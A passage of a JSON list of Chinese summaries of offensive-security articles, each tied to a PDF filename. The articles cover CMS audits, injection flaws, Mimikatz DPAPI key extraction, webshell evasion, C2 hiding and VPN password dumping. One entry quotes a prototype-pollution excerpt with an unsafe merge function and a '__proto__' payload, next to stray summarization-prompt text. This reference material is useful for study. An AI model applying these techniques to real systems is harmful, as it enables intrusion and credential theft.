        "page_content": "该文档详细介绍了对 TaoCMS 代码的审计，发现了三个漏洞：前台 DOM 型 XSS 漏洞、SQL 注入漏洞和 SSRF 漏洞。这些漏洞都是由于后端过滤不严谨和前端直接操作节点属性造成的。文档提供了漏洞复现步骤和 POC，并强调了防御 XSS 漏洞需要对输入和输出进行防御。",
        "FileName": "12499-PHP代码审计之TaoCMS（SQL注入+SSRF 0day）.pdf"
    },
    {
        "page_content": "本文重点介绍了使用 Mimikatz 读取 DPAPI 加密密钥的几种技术，包括域控的 DPAPI 备份密钥。通过这些技术，攻击者可以解密域内任何用户的秘密，无论他们是通过受害者的主机还是通过域控访问的。",
        "FileName": "9810-使用 MimiKatz 读取 DPAPI 加密密钥的几种方式.pdf"
    },
    {
        "page_content": "该文档讨论了 InfluxDB 1.x 中的 JWT 令牌空字符串漏洞，该漏洞允许攻击者伪造令牌并绕过身份验证。该漏洞是由默认情况下使用空字符串作为 JWT 消息认证码的共享密钥造成的。文档提供了利用该漏洞的自动化工具，并建议通过启用身份验证、修改共享密钥和启用 pprof-auth-enabled 选项来防御该漏洞。",
        "FileName": "10272-influxdb 1.x jwt token 空字符串漏洞的自动化利用与防御.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 KKCMS 内容管理系统进行代码审计的过程，发现了多个漏洞，包括验证码重用、文件上传、SQL 注入、XSS 和数据库信息泄露。审计强调了在 CMS 审计中采用系统的方法、注意开源软件和编辑器、利用 MySQL 查询语句监控、检查非 HTML 文件以及从重装文件开始审计的重要性。",
        "FileName": "7711-入门KKCMS代码审计.pdf"
    },
    {
        "page_content": "该文档介绍了智能合约中的“薅羊毛”漏洞，并以 2020 年 NSSC CTF 中的 skybank 题目为例，详细分析了漏洞原理和解题思路。该漏洞允许攻击者通过重复获取空投并转移资金，最终触发合约中的事件，从而获取 flag。文档提供了攻击演示，包括部署攻击合约和触发漏洞的过程。",
        "FileName": "9024-零时科技丨CTF技能宝典之智能合约#薅羊毛漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了对 stowaway 改造计划的分析，包括代码分析、短连接 bug 修复、流量全加密和数据压缩等方面的改造，旨在增强 stowaway 作为渗透代理工具的功能和安全性。",
        "FileName": "10607-stowaway改造计划1.pdf"
    },
    {
        "page_content": "Peach 是一款基于变异的模糊测试工具，本文介绍了如何使用 Peach Fuzzer 对 DNS 协议进行模糊测试，包括编译、数据建模、状态建模、Publisher、Monitor 和变异策略的配置，以及 Peach.exe 的执行。",
        "FileName": "10652-基于Peach的协议Fuzz 以DNS协议为例.pdf"
    },
    {
        "page_content": "该文档记录了对一个名为“对等保网站”的网站进行渗透测试的过程。测试人员首先进行了常规扫描，但没有发现明显的漏洞。随后，他们通过浏览网站发现了管理员账号信息，并通过爆破模式成功登录。在后台，他们找到了一个可以上传 ASPX 脚本的编辑器，并成功上传了一个免杀的马，获得了 shell 权限。然而，由于权限较低和 360 全家桶的保护，测试人员无法进一步提权。最终，他们通过生成木马并进行免杀，成功上传并执行了木马，但由于未知原因，木马没有产生任何反应。",
        "FileName": "9158-对等保网站的常规测试.pdf"
    },
    {
        "page_content": "Impacket 脚本库提供了一系列用于处理网络协议的 Python 类，并为某些协议提供对应的实现。本文档介绍了 Impacket 库中所有示例脚本的功能，包括远程执行、Kerberos 认证、Windows 密码转储和票据伪造等，并提供了脚本使用实例和常见选项。",
        "FileName": "11877-Impacket脚本利用指南（上）.pdf"
    },
    {
        "page_content": "堆喷思想在 glibc pwn 中的应用，通过大量申请内存，填充注⼊代码段，结合其他攻击技术控制程序执行流，最终获取 shellcode 执行权限。",
        "FileName": "7189-堆喷思想在glibc pwn中的应用.pdf"
    },
    {
        "page_content": "该文档分析了 Thinkphp5.1.x 中的两个反序列化利用链条，这些链条利用了 __destruct 和 __wakeup 方法，并通过一系列可控变量和方法调用触发命令执行。第一个链条涉及 think\\model\\concern\\Conversion 和 think\\model\\concern\\Attribute 类，而第二个链条涉及 think\\model\\concern\\Attribute 类中的 getAttr 方法。",
        "FileName": "10881-Thinkphp5.1.x 反序列利用链条分析.pdf"
    },
    {
        "page_content": "该文档介绍了三种反 CSRF 爆破姿势，包括使用 CSRF Token Tracker 插件、定义宏以及宏和 Extractor 的结合。第一种姿势适用于简单的 CSRF 爆破，第二种姿势通过定义宏在所有请求前获取新的 token，第三种姿势通过宏和 Extractor 的结合在请求前获取 token 并替换到请求中。",
        "FileName": "11419-反CSRF爆破的三种姿势.pdf"
    },
    {
        "page_content": "该文档记录了一次攻防演练中的代码审计过程，其中作者通过堆叠注入插入一条数据，并通过代码审计解密了加密数据，最终成功获取了目标网站的管理员权限。",
        "FileName": "11411-记录一次攻防演练中的代码审计.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 后台防护逻辑漏洞，该漏洞允许攻击者通过“图片水印设置”功能绕过防护机制，将任意代码写入配置文件中，从而获得远程代码执行权限。漏洞源于对全局转义过的参数再次进行替换操作，将单引号替换为空，导致原本转义的单引号被移除，从而绕过了防护机制。",
        "FileName": "10545-某CMS后台防护逻辑漏洞导致GETSHELL.pdf"
    },
    {
        "page_content": "该题考察的是对明⽂攻击的实战应⽤   在实际环境中不会主动提供明⽂⽂件⽤于明⽂攻击   需要⾃⼰寻找明⽂攻击的突破⼝   压缩包内含有两个⽂件 LICENSE 和 README.md LICENSE 为开源证书⽂件 将常⻅开源协议全下载下来   对⽐⼤⼩ 发现 Apache 2.0 ⼤⼩极为相近 使⽤ github  内置的 LICENSE ⽂件可以成功解密 还有⼀种简单的 base64 换表加密   这种⽅法在已知明⽂的时候⼗分脆弱 使⽤提供的⽇志很容易拼出第⼀个 http 请求的部分开头明⽂ ( 注意流量换⾏使⽤的是 \\n\\r) GET\t/\tHTTP/1.1 Host:\t192.168.234.176 User-Agent:\tMozilla/5.0\t(Windows\tNT\t10.0;\tWin64;\tx64;\trv:94.0)\tGecko/20100101\tFirefox/94.0 使⽤ base64 编码后与密⽂对⽐   可以还原出⼤部分映射表 剩余的少量映射关系可以通过爆破得出 拿到表后即可完整解密通信流量得到 flag",
        "FileName": "10642-第一届 “东软杯”网络安全CTF竞赛-官方WriteUp.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA <11.5 版本中的一个漏洞，该漏洞允许攻击者通过伪造参数来登录任意用户。漏洞存在于 logincheck_code.php 文件中，攻击者可以控制 UID 变量，从而控制 SQL 语句返回的用户信息。通过绕过 redis 验证，攻击者可以伪造参数并登录任意用户。本地复现步骤包括获取 code_uid、提交伪造的 code_uid 参数以获取 PHPSESSID 参数，最后使用伪造的参数登录。",
        "FileName": "7656-通达OA11.5版本漏洞分析与复现.pdf"
    },
    {
        "page_content": "该文档分析了 IBM WebSphere Application Server 中的远程代码执行漏洞 (CVE-2020-4450)，该漏洞是由 IIOP 协议上的反序列化恶意对象造成的。攻击者可以通过 IIOP 协议远程攻击 WAS 服务器，在目标服务端执行任意代码，获取目标系统权限。漏洞利用反序列化机制，通过修改环境变量中的 java.naming.factory.object 属性值，将 EJBHome 实例的 getObjectInstance 方法映射到 WSIFServiceObjectFactory 类，从而实现代码执行。",
        "FileName": "8248-WebSphere 远程代码执行漏洞浅析（CVE-2020-4450）.pdf"
    },
    {
        "page_content": "该文档详细介绍了整数溢出漏洞，包括其类型、成因和利用方法。文档中给出了一个示例程序，展示了如何利用整数溢出绕过检查，并提供了利用该漏洞的 Python 脚本。",
        "FileName": "12747-整数溢出详解.pdf"
    },
    {
        "page_content": "WordPress 插件 Media Library Assistant 2.81 存在本地文件包含 (LFI) 和跨站脚本 (XSS) 漏洞。LFI 漏洞允许攻击者读取插件目录下的文件，而 XSS 漏洞允许攻击者在插件设置页面注入恶意脚本。在 2.82 版本中，LFI 漏洞已修复，XSS 漏洞已通过过滤函数修复。",
        "FileName": "7722-Wordpress 插件 Media Library Assistant 2.81-(LFI和XSS).pdf"
    },
    {
        "page_content": "BloodHound 是一款基于 Neo4j 数据库的单页 JavaScript Web 应用程序，用于可视化 Active Directory 环境中的权限关系。它使攻击者能够轻松识别复杂的攻击路径，而防御者则可以利用它来识别和防御这些路径。BloodHound 具有查询模块，允许用户查找具有 DCSync 权限的主体、具有外部域组成员身份的组、到达无约束委托系统的最短路径等信息。",
        "FileName": "7311-利用BloodHound分析域中的攻击路径.pdf"
    },
    {
        "page_content": "DOM Clobbering 是一种攻击技术，它利用 HTML 元素之间的关系来破坏对象的属性值。通过组合具有特定属性的元素，攻击者可以访问和修改原本不可控的属性，从而导致 XSS、CSRF 等漏洞。本文介绍了 DOM Clobbering 的原理，并提供了新的技术，包括利用锚标记的 username 和 password 属性、使用 iframe 和 srcdoc 破坏多层属性，以及使用 style/link 元素导入样式表来触发延迟渲染。",
        "FileName": "7343-DOM Clobbering重见天日.pdf"
    },
    {
        "page_content": "**主题：**若依管理后台存在代码执行漏洞，可通过反射和Thymeleaf注入执行任意命令。\n\n**内容：**该漏洞利用了若依管理后台定时任务中反射执行方法的机制，通过构造特定的payload，可以绕过构造函数和方法参数类型的限制，反射执行具有代码执行潜力的方法。此外，还利用了Thymeleaf语法中的片段选择器，通过构造恶意片段，可以绕过安全检查，执行SpringEL表达式，最终实现代码执行。",
        "FileName": "10637-若依管理后台的一些代码执行漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了红队实战系列的第一个靶场，该靶场模拟了 ATT&CK 攻击链路，并提供了详细的步骤指导，包括信息收集、外网渗透、内网渗透、提权和反弹 shell，最终拿下域成员和域控主机。",
        "FileName": "10076-ATT&CK实战系列——红队实战(一).pdf"
    },
    {
        "page_content": "该文档分析了 Insomni'hack 比赛中一个名为 \"ontestament.bin\" 的二进制文件，该文件包含多个堆栈技巧，包括初始化安装步骤、逆向工程程序漏洞、泄漏地址和二次 Free Fastbin Exploit。通过利用这些技巧，作者能够利用该程序中的漏洞并获得 shell 权限。",
        "FileName": "12360-【二进制分析】比赛中常见好用的使用堆栈技巧.pdf"
    },
    {
        "page_content": "该文档介绍了对一个 Node.js 网站进行渗透测试的过程，重点关注了通过分析 JavaScript 文件发现未授权的 API 接口，利用这些接口爆破弱密码，并通过修改返回包中的值绕过前端权限控制，最终成功进入管理员后台。",
        "FileName": "10978-记一次Node.js站点渗透.pdf"
    },
    {
        "page_content": "本文介绍了学习二进制安全的路径，从 CTF 竞赛开始，逐步深入到漏洞挖掘和利用，并提供了不同方向的学习建议，如 IoT 安全、浏览器安全、操作系统安全和虚拟化安全。作者强调了逆向能力的重要性，并建议通过复现漏洞和分析公开漏洞来提高技能。此外，本文还推荐了书籍、博客和研究论文等学习资源。",
        "FileName": "12402-二进制安全学习之路.pdf"
    },
    {
        "page_content": "该文档分析了 D-LINK DIR-815 路由器中存在的多个缓冲区溢出漏洞，详细介绍了漏洞的原理、定位、偏移确定和利用方法，并提供了相关的工具和资源。",
        "FileName": "9939-IOT安全快速入门_D-LINK DIR-815漏洞硬核图解过程.pdf"
    },
    {
        "page_content": "该文档分析了 CC 链中的一个漏洞，该漏洞利用 FastHashMap 的 equals() 方法、DefaultedMap 的 get() 方法、FactoryTransformer 的 transformer() 方法和 TemplatesImpl 的 newTransformer() 方法来实现远程代码执行 (RCE)。该漏洞利用了 HashTable 的 readObject() 方法，通过反射修改 key 的值，从而触发 FastHashMap 的 equals() 方法，最终加载恶意字节码。",
        "FileName": "12135-从FastHashMap到TemplatesImpl.pdf"
    },
    {
        "page_content": "该文档分析了如何利用 IO leak IO leak F4atherw1t 在 Linux 系统中泄露基址，该方法适用于没有开启 FULL RELRO 保护的程序。文档介绍了 IO 库中 FILE 结构体的相关知识，以及如何通过篡改 FILE 结构体中的字段和 vtable 来泄露基址。文档还提供了利用该方法进行攻击的示例代码。",
        "FileName": "12638-IO leak.pdf"
    },
    {
        "page_content": "该文档分析了 iperf 中的 CVE-2023-38403 溢出漏洞，该漏洞是由 calloc 分配的长度大小可由攻击者控制且程序在申请堆块之前对传入的长度值 +1 导致的。当传入的值为 0xffffffff 时，+1 后变为 0，导致空指针分配，再次调用时引发程序崩溃。补丁中加入了长度值判断，如果 +1 为 0 则不进行内存分配。",
        "FileName": "12736-iperf溢出漏洞分析_CVE-2023-38403.pdf"
    },
    {
        "page_content": "**主题：** java-object-searcher 工具的原理和使用方法\n\n**内容：** java-object-searcher 是一款 Java 内存对象搜索工具，它使用广度优先或深度优先算法在内存中搜索特定对象。该工具允许用户指定搜索关键字和排除列表，并提供调试模式以生成日志文件。通过分析对象类型（如 Map、数组和类），该工具可以递归地遍历对象图，直到找到匹配的关键字或达到最大搜索深度。",
        "FileName": "11857-内存对象搜索原理剖析.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 中 `php://filter` 的底层实现，重点关注了如何使用 URL 过滤器来读取和过滤文件。它解释了如何使用 `php_stream_open_wrapper` 函数来判断文件是否存在，以及如何使用 `php_stream_apply_filter_list` 函数来应用过滤器。文档还提供了示例代码，展示了如何使用 `php://filter/resource=` URL 过滤器来读取和过滤文件，并讨论了如何构造恶意 URL 过滤器来绕过安全限制。",
        "FileName": "10430-phpfilter 的浅略底层分析.pdf"
    },
    {
        "page_content": "稻草人企业站 1.1.5 代码审计报告分析了该 CMS 的安装过程信息泄露、管理员后台任意文件上传、后台任意文件删除等漏洞，并提供了详细的审计过程和代码分析，强调了黑盒测试的重要性。",
        "FileName": "7904-稻草人企业站1.1.5代码审计.pdf"
    },
    {
        "page_content": "**主题：** 利用 JSRPC 协议实现任意用户登录和密文爆破\n\n**内容：** 该文档介绍了如何利用 JSRPC 协议实现任意用户登录，并使用 SekiroClient 和 mitmproxy 进行密文爆破。它提供了详细的步骤，包括注册动作、修改 sekio.js、使用 Python 爬取加密数据、在 Burp 中使用 mitmproxy 加密参数，以及设置代理和发送加密包。",
        "FileName": "12897-利用JSRPC协议实现任意用户登录.pdf"
    },
    {
        "page_content": "本文档介绍了作者在一次授权的实战测试中，通过猜解 .NET 代码审计拿下目标权限的过程。作者通过百度学习了 ASPX 审计知识，并通过反编译 DLL 文件和分析代码，发现了 VerifyCode 泄露导致 SQL 注入的漏洞。随后，作者利用测试页面中泄露的 MD5 校验码绕过了 IsValidRequest 的判断，构造数据包成功触发了 SQL 注入，获得了目标权限。",
        "FileName": "9403-记一次靠猜的.net代码审计拿下目标.pdf"
    },
    {
        "page_content": "本文档介绍了基于 Cssom 的暗链检测技术，该技术通过判断网页中是否存在敏感词来识别暗链。暗链是一种不可见的网站链接，通常用于非法 SEO，其特征包括：外链、内链、死链和暗链。暗链的检测方法包括：判断链接颜色和文字是否与背景色相似、判断链接位置是否处于可视区外、判断链接是否被隐藏、判断链接是否被重定向等。",
        "FileName": "12607-基于Cssom的暗链检测技术.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用 Heroku 反向代理隐藏 C2 域名的技术，通过在 Heroku 上建立一个堡垒机，使用 nginx 反向代理将请求转发到目标服务器，从而隐藏 C2 域名的真实地址。该方法的优点是地址被封禁后可以轻松重建，缺点是仅支持 HTTP 协议且存在被 Heroku 封号的风险。",
        "FileName": "9761-Heroku反向代理隐藏C2域名.pdf"
    },
    {
        "page_content": "该文档主要讨论了 JNDI 注入攻击的演变，从 8u121 之前的 RMI + JNDI 注入到 8u191 之后的绕过方法，包括利用 tomcat8 的类、依赖 groovy 2 以上相关类、利用 javaSerializedData 属性等。",
        "FileName": "10035-8u191后的JNDI注入利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用公众号接口漏洞从后台登录口到旁站获取 getshell。研究人员通过发现公众号考核平台的弱口令，成功登录后台，并利用 SQL 注入漏洞访问到旁站。随后，他们利用旁站的文件上传漏洞，通过上传木马文件成功获取 getshell。",
        "FileName": "12321-探究公众号接口漏洞：从后台登录口到旁站getshell.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Fofa 爬虫和源码泄露 PoC 来查找和测试网站上的源码泄露漏洞。它提供了详细的步骤，包括如何获取 Fofa 会话 cookie、使用 Fofa 爬取 URL、运行源码泄露 PoC 以及解释结果。此外，文档还提供了额外的 PoC 和福利，例如 web.txt 字典和 GitHub 存储库。",
        "FileName": "9362-fofa爬虫 + 源码泄露PoC之梦幻联动(有福利).pdf"
    },
    {
        "page_content": "Wpbullet 是一款针对 WordPress 插件和主题进行静态代码审计的工具，它通过正则表达式分析代码，识别潜在的漏洞，如任意用户删除漏洞，但由于其基于文本特征的分析方式，可能会存在漏报问题。",
        "FileName": "7668-一款针对Wordpress开发的代码审计工具——Wpbuttle（工具介绍与源码分析）.pdf"
    },
    {
        "page_content": "wJa 是一款结合 DAST、SAST、IAST 的综合性应用程序安全分析工具，支持对 java web 程序的安全性进行分析，包含反编译、代码审计、调试 jar 包、代理追踪等用于分析软件安全的功能。本文通过几个示例讲解如何使用 wJa 进行软件安全性分析，并介绍了 wJa 的工作原理、cheetah 脚本语言、IAST 跟踪、SQL 注入检测、危险库获取、fastjson 检测、mybatis 类型的 SQLI 检测等功能。",
        "FileName": "10792-wJa (D&S&I)AST 工具.pdf"
    },
    {
        "page_content": "该文档介绍了多种绕过 Web 应用程序防火墙 (WAF) 的 PHP、Java 和 ASPX webshell 免杀技术，包括利用语法错误、特殊符号、Unicode 编码、空字符串连接、CDATA 特性、实体化编码、头部替换和注释等方法，以实现命令执行和绕过检测。",
        "FileName": "10937-测试几种实战成功过的webshell的免杀方式.pdf"
    },
    {
        "page_content": "该文档详细介绍了 waychar 报名系统 VER 0.30 中的六处 SQL 注入漏洞，包括前台登录、找回密码、重置密码、活动信息和会员管理搜索处的漏洞。这些漏洞都是由于参数未经过过滤，导致攻击者可以构造恶意 SQL 语句来获取敏感信息或执行任意代码。",
        "FileName": "8933-waychar报名系统VER 0.30 SQL注入复现.pdf"
    },
    {
        "page_content": "该文档总结了绕过 Web 应用程序防火墙 (WAF) 上传文件限制的常用方法，包括寻找非黑名单扩展名、构造畸形数据包、替换被检测内容、利用文件包含或反射调用外部代码，以及通过曲线救国的方式上传 shell。",
        "FileName": "7531-文件上传突破waf总结.pdf"
    },
    {
        "page_content": "本文档介绍了通过调试方法进行 API 钩取的技术，该技术涉及将目标进程附加到调试器并修改其内存和寄存器以截取和修改 API 函数的执行流程。本文档详细介绍了调试器的工作原理、API 钩取的步骤以及涉及的关键数据结构，例如 CREATE_PROCESS_DEBUG_INFO、EXCEPTION_RECORD 和 DEBUG_EVENT。",
        "FileName": "11963-API钩取：通过调试手段钩取API函数.pdf"
    },
    {
        "page_content": "该文档分析了 Java 安全反序列化中的 CC1 链，重点介绍了 Apache Commons Collections 组件中的 Transformer 和 ChainedTransformer 类，以及 TransformedMap 类的作用。通过构建一个恶意 POC，文档展示了如何利用这些类来执行任意代码，并通过 AnnotationInvocationHandler 类的 readObject 方法触发命令执行。",
        "FileName": "12715-Java安全反序列化之CC1链的分析与利用.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-9496 Apache Ofbiz XMLRPC RCE 漏洞，该漏洞允许攻击者通过 XMLRPC 接口执行任意代码。漏洞的根源在于 XMLRPC 解析器在处理包含序列化数据的 XML 请求时存在反序列化漏洞。攻击者可以通过构造包含恶意序列化数据的 XML 请求来触发漏洞，从而在目标系统上执行任意代码。",
        "FileName": "8324-CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了一次钓鱼邮件，该邮件包含一个带密码的压缩文件，其中包含一个带有宏的 Excel 文件。分析表明，该文件利用 Excel 宏向受害者提供有效载荷，实现钓鱼攻击。沙箱分析和反病毒引擎确认该文件是 Emotet 家族木马，该木马通过钓鱼邮件传播，附件中通常包含带有恶意宏的 Office 文件。",
        "FileName": "11519-某次钓鱼邮件分析（Emotet木马）.pdf"
    },
    {
        "page_content": "本篇文档主要介绍了如何对10.10.1.47 LightCMS后台登录信息群里已经给了进行渗透，通过任意文件读取、文件包含、命令执行等漏洞最终获取域控权限，并通过域控权限获取flag。",
        "FileName": "9738-DozerCTF2021 域渗透 Workthrough.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n\n**文档内容：**\n\n原型链污染是一种 JavaScript 中独有的安全问题，挺有⼀ 14 。 在 JavaScript 发展历史上，很少有真正的私有属性，类的所有属性都允许被公开的访问和修改，包括 proto ，构造函数和原型。攻击 者可以通过注⼊其他值来覆盖或污染这些 proto ，构造函数和原型属性。然后，所有继承了被污染原型的对象都会受到影响。原型 链污染通常会导致拒绝服务、篡改程序执⾏流程、导致远程执⾏代码等漏洞。 原型链污染的发⽣主要有两种场景： 不安全的对象递归合并 和 按路径定义属性 。 ⾸先我们要搞清楚这样⼀件事 在 JavaScript 中 只有⼀种结构 : 对象 , 也就是常说的 \" 万物皆对象 \" 。 ⽽每个实例对象都有⼀个原型对象 , ⽽原型对象则引申出其对应的原型对象 , 经过⼀层层的链式调⽤ , 就构成了我们常说的 \" 原型链 \" 。 每个实例对象（ object ）都有⼀个私有属性（   \t __proto__ \t ）指向它的   构造函数的原型对象   （ prototype ）。该原型对象也有⼀个 ⾃⼰的原型对象（   \t __proto__ \t ），层层向上直到⼀个对象的原型对象为   \t null \t 。根据定义， \t null \t   没有原型，并作为这个原型 链中的最后⼀个环节。 我们可以通过以下⽅式访问得到某⼀实例对象的原型对象： objectname .[[ prototype ]] objectname . prototype objectname [ \"__proto__\" ] objectname . __proto__ objectname . constructor . prototype 在创建对象时，就会有⼀些预定义的属性。其中在定义 函数 的时候，这个预定义属性就是  prototype ，这个  prototype  是⼀个普通 的原型对象。 ⽽定义 普通的对象 的时候，就会⽣成⼀个   \t __proto__ \t ，这个   \t __proto__ \t   指向的是这个对象的构造函数的  prototype 。 JavaScript  对象有⼀个指向⼀个原型对象的链。当试图访问⼀个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原 型，以及该对象的原型的原型，依次层层向上搜索，直到找到⼀个名字匹配的属性或到达原型链的末尾。这条链⼦就是原型链了。 所有类对象在实例化的时候将会拥有 \t prototype \t 中的属性和⽅法，这个特性被⽤来实现 JavaScript 中的继承机制。 这⾥⽤⼀个 p 神的例⼦ 写在前⾯ 原型链与原型 原型链继承function \t Father () \t { \t\t\t\t this . first_name \t = \t 'Donald' \t\t\t\t this . last_name \t = \t 'Trump' } function \t Son () \t { \t\t\t\t this . first_name \t = \t 'Melania' } Son . prototype \t = \t new \t Father () let \t son \t = \t new \t Son () console . log ( `Name:\t ${ son . first_name } \t ${ son . last_name } ` ) 我们来分析⼀下这段代码， Son 这个函数的原型通过 \t Son.prototype\t=\tnew\tFather() \t 这⼀段代码继承了 Father 的属性，然后通 过构造函数将 Son 实例化为对象 son ，当我们输出 first_name 的时候，引擎会先在构造出对象的函数中寻找，也就是在 Son 中寻找， 找到了 Melania 并输出，在输出 last_name 的时候，先在 Son 中查找，没有找到，然后引擎就会去 \t son.__proto__ \t 中寻找，通过我 们的学习，可以知道 \t son.__proto__\t==\tSon.prototype \t ，⼜因为 \t Son.prototype\t=\tnew\tFather() \t 所以 Son 的圆形中就会有 Father 的属性，就输出了我们所看到的结果了。 那如果在 \t son.__proto__ \t 中没找到呢？ 如果仍然找不到，则继续在 son. proto . proto 中寻找 last_name 依次寻找，直到找到 null 结束。⽐如， Object.prototype 的 proto 就是 null JavaScript 的这个查找的机制，被运⽤在⾯向对象的继承中，被称作 prototype 继承链。 我们需要记住： 每个构造函数 (constructor) 都有⼀个原型对象 (prototype) 对象的 proto 属性，指向类的原型对象 prototype JavaScript 使⽤ prototype 链实现继承机制 为啥要学这个呢？因为我们需要以这种形式对原型链进⾏传值，来对其进⾏污染 JSON 语法JSON  语法是  JavaScript  语法的⼦集。 JSON  语法衍⽣于  JavaScript  对象标记法语法： 数据在名称 / 值对中 数据由逗号分隔 花括号容纳对象 ⽅括号容纳数组 JSON 键 / 值对由 键和值 组成， 键必须是字符串 ，值可以是字符串（ string ）、数值 (number)  、对象（ object ）、数组（ array ）、 true 、 false 、 null 。 在定义 JSON 键 / 值时，先是键名，后⾯写⼀个冒号，然后是值。如： \"github\" : \t \"https://github.com/\" 就等价于 github \t = \t \"https://github.com/\" 再举个例⼦ var \t object \t = \t { \t\t 'a' : \t [{ \t 'b' : \t 2 \t }, \t { \t 'd' : \t 4 \t }] }; var \t other \t = \t { \t\t 'a' : \t [{\n46.var \t object \t = \t { \t\t 'a' : \t [{ \t 'b' : \t 2 \t }, \t { \t 'd' : \t 4 \t }] }; var \t other \t = \t { \t\t 'a' : \t [{ \t 'c' : \t 3 \t }, \t { \t 'e' : \t 5 \t }] }; _ . merge ( object , \t other ); //\t=>\t{\t'a':\t[{\t'b':\t2,\t'c':\t3\t},\t{\t'd':\t4,\t'e':\t5\t}]\t} 我们先看⼀个语句 object [ a ][ b ] \t = \t value 我们如果可以控制 [a] 、 [b] 和 value 的值，将 [a] 设置为 \t __proto__ \t ，那我们就可以给对象的原型设置⼀个值为 value 的 b 属性了。 这样所有继承 object 对象原型的实例对象都将会在本身没有 b 这⼀属性的情况下，拥有⼀个值为 value 的 b 属性。 举个例⼦ 原型链污染为啥没在 object2 中设置 foo 属性还可以输出 Hello World 呢？ 是因为在第⼆条语句中，我们对  object1  的原型对象设置了⼀个  foo  属性，⽽  object2  和  object1  ⼀样，都是继承了 Object.prototype 。在获取  object2.foo  时，由于  object2  本身不存在  foo  属性，就会往⽗类  Object.prototype  中去寻找。 这就造成了⼀个原型链污染，所以原型链污染简单来说就是如果能够控制并修改⼀个对象的原型，就可以影响到所有和这个对象同 ⼀个原型的对象。 哪些情况下我们可以设置 \t __proto__ \t 的值呢？其实找找能够控制数组（对象）的 “ 键名 ” 的操作即可： Merge  类操作是最常⻅可能控制键名的操作，也最能被原型链攻击。 这⾥还是 p 神的例⼦ 以对象 merge 为例，我们想象⼀个简单的 merge 函数： function \t merge ( target , \t source ) \t { \t\t\t\t for \t ( let \t key \t in \t source ) \t { \t\t\t\t\t\t\t\t if \t ( key \t in \t target ) \t { \t\t\t\t\t\t\t\t\t\t\t\t merge ( target [ key ], \t source [ key ]) \t\t\t\t\t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t\t\t\t\t target [ key ] \t = \t source [ key ] \t\t\t\t\t\t\t\t } \t\t\t\t } } 在合并的过程中，存在赋值的操作 \t target[key]\t=\tsource[key] \t ，那么，这个 key 如果是 \t __proto__ \t ，是不是就可以原型链污 染呢？ 我们⽤如下代码实验⼀下： Merge  类操作导致原型链污染let \t o1 \t = \t {} let \t o2 \t = \t { a : \t 1 , \t \"__proto__\" : \t { b : \t 2 }} merge ( o1 , \t o2 ) console . log ( o1 . a , \t o1 . b ) 可以看到，数据被合并了，那么验证⼀下原型链有没有被污染 可以看的出来，并没有。 这是因为，我们⽤ JavaScript 创建 o2 的过程（ \t let\to2\t=\t{a:\t1,\t\"__proto__\":\t{b:\t2}} \t ）",
        "FileName": "12053-关于Prototype Pollution Attack的二三事.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何从 goby 指纹提取工具中提取 YARA 规则，包括分析 goby 的嵌入式资源、理解 YARA 虚拟机结构、编写 YARA 反编译器以及将规则转换为可读的中缀表达式。",
        "FileName": "11701-goby指纹提取与yara逆向.md.pdf"
    },
    {
        "page_content": "本文介绍了 Java 远程方法调用 (RMI) 协议，分析了 RMI 攻击面，并提供了攻击 RMI 服务的工具 attackRmi。该工具使用 socket 直接发送 RMI 协议数据包，简化了攻击过程。文章还详细介绍了 RMI 协议的报文格式、攻击方法和限制条件，并提供了攻击 RMI 服务的示例代码。",
        "FileName": "8247-attack-rmi-registry-and-server-with-socket.pdf"
    },
    {
        "page_content": "该文档分析了针对 top chunk 的两种特殊攻击手法，即 House Of Force 和 House Of Einherjar。House Of Force 利用 top chunk 的漏洞通过修改 topchunk_size 来进行攻击，而 House Of Einherjar 则利用向后合并机制与利⽤⽅法来实现 chunkA 后向合并到 fake chunk。",
        "FileName": "12648-针对top chunk的一些特殊攻击手法.pdf"
    },
    {
        "page_content": "本文分析了 PHP RASP（运行时应用程序自我保护）的技术，它通过跟踪信息流和安全检查来检测攻击并进行自我保护。本文重点介绍了污点标记方法，该方法通过标记可控变量来跟踪信息流，并在敏感函数中进行安全检查以防止攻击。",
        "FileName": "7316-从0开始的PHP RASP的学习.pdf"
    },
    {
        "page_content": "该文档介绍了突破前端加密方法的各种技术，包括使用中间服务器、断点调试 JS、Fiddler 替换 JS 等，并提供了 Python 和 Selenium 脚本示例，用于自动化爆破加密的登录表单。",
        "FileName": "7190-突破前端加密方法总结.pdf"
    },
    {
        "page_content": "WordPress Rank Math SEO 插件存在一个任意元数据修改漏洞，允许未经身份验证的攻击者更新 WordPress 站点中的任意元数据，从而可以修改文章、评论，甚至提权或降级用户权限。该漏洞位于 gutenberg_routes 方法中，通过调用 update_metadata 函数更新元数据，而 update_metadata 函数可以更新任意类型元数据，包括用户权限相关的元数据。攻击者可以通过调用存在漏洞的自定义接口，构造数据包修改用户权限，从而获得管理员权限或限制管理员登录。",
        "FileName": "7616-WordPress Rank Math SEO插件任意元数据修改漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何在 Ubuntu 服务器上搭建 Zimbra RCE 环境，并利用 XXE 和 SSRF 组合拳实现远程代码执行。它提供了详细的步骤，包括环境搭建、漏洞利用、获取低权限 token、获取高权限 token 和上传 webshell。",
        "FileName": "7991-zimbra RCE环境搭建到复现再到exp编写.pdf"
    },
    {
        "page_content": "该文档介绍了一种在内网渗透中获取 VPN 密码的小技巧。当目标主机中存在 VPN 连接客户端且保存了密码时，可以通过将正确的密码后加一个字符，然后将客户端进程的内存进行 dump，再使用 strings 命令搜索特定字符串来获取密码。",
        "FileName": "7102-内网渗透-VPN密码获取小技巧.pdf"
    },
    {
